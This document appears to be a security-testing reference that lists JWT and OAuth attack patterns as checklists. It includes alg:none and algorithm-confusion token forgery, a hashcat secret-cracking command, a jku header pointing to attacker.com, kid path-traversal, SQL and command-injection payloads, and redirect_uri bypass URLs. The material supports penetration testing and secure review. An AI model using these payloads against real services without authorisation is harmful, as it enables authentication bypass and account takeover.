# JWT & OAuth Attack Patterns

Consolidated reference for attacking JWT tokens and OAuth implementations. Use with `api-security-review`, `secure-code-review`, and `exploit-validation` skills.

---

## JWT Attacks

### 1. Algorithm None Attack
Server doesn't enforce algorithm; attacker sets `alg: none` to skip signature verification.

```
# Original header
{"alg": "RS256", "typ": "JWT"}

# Attack header — try each variant
{"alg": "none", "typ": "JWT"}
{"alg": "None", "typ": "JWT"}
{"alg": "NONE", "typ": "JWT"}
{"alg": "nOnE", "typ": "JWT"}

# Remove signature section (third part after last dot)
eyJ...header.eyJ...payload.
eyJ...header.eyJ...payload
```

- [ ] Modify header to `alg: none`, remove signature
- [ ] Test case variations (None, NONE, nOnE)
- [ ] Test with empty signature vs missing signature

### 2. Algorithm Confusion (RS256 → HS256)
Server uses RSA public key; attacker signs with HS256 using RSA public key as HMAC secret.

```
# Original: RS256 (asymmetric, private key signs, public key verifies)
# Attack:   HS256 (symmetric, sign with public key as shared secret)

# Steps:
1. Obtain server's RSA public key (from /jwks, /.well-known, certificate, etc.)
2. Change JWT header: {"alg": "HS256", "typ": "JWT"}
3. Sign payload with public key as HMAC-SHA256 secret
4. Submit modified token
```

- [ ] Obtain RSA public key from JWKS endpoint, certificate, or configuration
- [ ] Change `alg` from RS256/RS384/RS512 to HS256/HS384/HS512
- [ ] Sign with public key as symmetric secret
- [ ] Test: does server accept the forged token?

### 3. Weak HMAC Secret
Brute-force weak HS256 signing secrets.

```bash
# Tools: jwt_tool, hashcat, john
# Crack with hashcat:
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Common weak secrets:
secret, password, 123456, jwt_secret, changeme, your-256-bit-secret
```

- [ ] Attempt brute force with common secrets list
- [ ] Check for default framework secrets (e.g., Django `SECRET_KEY` defaults)
- [ ] If cracked: forge tokens with arbitrary claims

### 4. JWK Injection (Header-Embedded Key)
Embed attacker-controlled key in JWT header; server uses it to verify.

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker-generated-public-key-modulus>",
    "e": "AQAB"
  }
}
```

- [ ] Generate RSA key pair
- [ ] Embed public key in JWT `jwk` header parameter
- [ ] Sign with corresponding private key
- [ ] Test if server uses embedded JWK for verification

### 5. JKU/X5U Header Injection
Set `jku` (JWK Set URL) or `x5u` (X.509 URL) to attacker-controlled server hosting a JWKS.

```json
{"alg": "RS256", "jku": "https://attacker.com/.well-known/jwks.json"}
```

- [ ] Host JWKS/X509 cert on attacker-controlled URL
- [ ] Set `jku` or `x5u` header to attacker URL
- [ ] Sign token with corresponding private key
- [ ] Test: does server fetch and trust attacker's JWKS?

### 6. KID (Key ID) Manipulation
`kid` parameter used to select verification key; inject path traversal, SQL, or command.

```json
# Path traversal to use known file as key
{"alg": "HS256", "kid": "../../public/known-static-file"}
# Sign with content of that file as HMAC secret

# SQL injection in kid (if kid used in DB query)
{"alg": "HS256", "kid": "1' UNION SELECT 'attacker-key' -- "}

# Command injection (rare)
{"alg": "HS256", "kid": "key1 | /usr/bin/id"}
```

- [ ] Test `kid` with path traversal to known static file
- [ ] Test `kid` with SQL injection payloads
- [ ] Test `kid` with null/empty values

### 7. Claim Manipulation
After signature bypass, modify payload claims.

```json
{
  "sub": "admin",           // change to admin user
  "role": "administrator",  // escalate role
  "is_admin": true,         // add admin flag
  "exp": 9999999999,        // extend expiration far into future
  "iss": "trusted-issuer"   // spoof issuer
}
```

- [ ] Change `sub` to another user's ID
- [ ] Add/modify role claims
- [ ] Extend `exp` to far future
- [ ] Change `iss` to test multi-tenant isolation

### 8. Token Lifecycle Issues

- [ ] Token reusable after logout (not server-side invalidated)
- [ ] Refresh token not rotated on use
- [ ] Access token lifetime too long (> 15 minutes)
- [ ] No token revocation mechanism
- [ ] Refresh tokens stored insecurely (localStorage, cookie without HttpOnly)

---

## OAuth 2.0 Attacks

### 1. Authorization Code Interception

- [ ] `redirect_uri` validation strict? Test:
  - Subdirectory: `https://legit.com/callback/../attacker`
  - Subdomain: `https://attacker.legit.com/callback`
  - Fragment: `https://legit.com/callback#@attacker.com`
  - Parameter pollution: `redirect_uri=legit&redirect_uri=attacker`
  - URL encoding: `redirect_uri=https%3A%2F%2Fattacker.com`
  - Localhost: `redirect_uri=http://localhost`
- [ ] Open redirect on application used as `redirect_uri` relay

### 2. CSRF on Authorization Flow

- [ ] `state` parameter present and validated?
- [ ] `state` parameter tied to session (not static)?
- [ ] Can attacker craft authorization URL and victim's account gets linked?
- [ ] PKCE (`code_verifier`/`code_challenge`) enforced for public clients?

### 3. Authorization Code Replay

- [ ] Authorization code single-use? (use same code twice)
- [ ] Authorization code time-limited? (use after 10+ minutes)
- [ ] Code bound to client? (exchange code with different client_id)
- [ ] Code bound to redirect_uri? (exchange code with different redirect_uri)

### 4. Token Leakage

- [ ] Access token in URL fragment (implicit flow) — sniffable via Referer
- [ ] Token in query parameter — logged, cached, Referer-leaked
- [ ] Token in browser history
- [ ] Token in client-side storage (localStorage — XSS accessible)

### 5. Client Credential Exposure

- [ ] `client_secret` in client-side code (mobile app, SPA)
- [ ] `client_secret` in public repository
- [ ] Dynamic client registration allowing secret extraction

### 6. Scope Escalation

- [ ] Request broader scopes than authorized: `scope=admin read write`
- [ ] Request scopes incrementally (first `read`, then add `write`)
- [ ] Does token endpoint enforce scope restrictions?
- [ ] Can refresh token request expand scope?

### 7. PKCE Bypass

- [ ] Is PKCE required or optional for public clients?
- [ ] Can `code_challenge_method` be omitted?
- [ ] Can `code_verifier` be omitted at token endpoint?
- [ ] Downgrade from S256 to plain method?

### 8. Token Exchange Attacks

- [ ] Test token exchange with stolen authorization code
- [ ] Test cross-client token exchange
- [ ] Device authorization flow: endpoint polling without rate limit
- [ ] Device flow: social engineering user to enter attacker's code

---

## Testing Checklist Summary

| Category | Tests | Skill |
|----------|-------|-------|
| JWT `alg: none` | 4 variants | api-security-review |
| JWT algorithm confusion | RS→HS key confusion | exploit-validation |
| JWT weak secret | Brute force | exploit-validation |
| JWT header injection | jwk, jku, x5u, kid | api-security-review |
| JWT claim manipulation | sub, role, exp, iss | api-security-review |
| JWT lifecycle | Revocation, rotation, lifetime | secure-code-review |
| OAuth redirect_uri | 6+ bypass techniques | api-security-review |
| OAuth state/CSRF | State validation, PKCE | api-security-review |
| OAuth code replay | Single-use, time-limit, binding | api-security-review |
| OAuth token leakage | Fragment, query, storage | secure-code-review |
| OAuth scope escalation | Scope expansion attempts | api-security-review |
